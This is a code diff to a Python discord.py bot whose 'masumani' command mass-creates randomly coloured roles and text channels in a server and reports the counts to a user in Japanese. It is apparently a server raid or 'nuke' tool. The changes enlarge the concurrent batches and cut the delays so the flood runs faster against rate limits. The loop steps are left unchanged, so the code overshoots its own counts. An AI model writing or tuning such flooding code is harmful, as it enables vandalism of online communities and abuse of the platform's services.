@@ -79,14 +79,14 @@ async def masumani(ctx):
     try:
         role_created = 0
         for i in range(0, role_count, 15):
-            batch = min(15, role_count - i)
+            batch = min(20, role_count - i)
             role_tasks = []
             for j in range(batch):
                 color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
                 role_tasks.append(guild.create_role(name=role_name, color=color))
             role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
             role_created += sum(1 for r in role_results if not isinstance(r, Exception))
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.2)
         await user.send(f'ロール作成: {role_created}個')
     except Exception as e:
         await user.send(f'ロール作成失敗')
@@ -144,14 +144,14 @@ async def masumani(ctx):
     created_count = 0
     try:
         for i in range(0, channel_count, 20):
-            batch = min(20, channel_count - i)
+            batch = min(40, channel_count - i)
             channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
             channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
             for r in channel_results:
                 if not isinstance(r, Exception):
                     created_channels.append(r)
                     created_count += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.3)
         await user.send(f'チャンネル作成: {created_count}個')
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
